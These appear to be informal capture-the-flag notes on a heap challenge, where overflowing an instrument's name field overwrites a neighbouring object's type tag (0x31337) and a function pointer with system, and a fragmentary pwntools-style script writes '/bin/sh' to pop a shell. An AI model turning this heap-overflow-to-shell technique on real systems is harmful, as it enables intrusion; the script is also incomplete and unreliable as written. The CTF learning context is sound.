

Because there was no win function but there was a fail function, and there is a system call. binsh not in binary so we have to write it 
Write to heap because it's a heap challenge. There is a canary and no clear way to leak the canary.

display function checks for guitar and anything other than 31337 is a drum (binja)

in gdb 
borrow guitar
name
test
display instrument
name instrument
AAAAAAAAAAAAAAAA

GDB shows 31337 is now something else

binja 
name function
drums 32 are larger than guitars 16
31337 -> address (is guitar)

make drum into guitar 
borrow drum to make space 32 fill with overwrite the one next to 31337 to system 

write binsh to memory



binary
elf

p = process(binary)

p.recvuntil(b'>>> ')

p.sendline 1
p.recvuntil >>>

sendline 3
recvuntil >>>

sendline 0
recvuntil >>>

write binsh 
chain = b''
chain += b'/bin/sh\0'
chain += b'A' * 8 

chain += p64(0x31337) # make it a guitar
chain += elf.sym system 

recvl

chain +=  4 #display 

recvl
chain +=

send chain 
interactive 
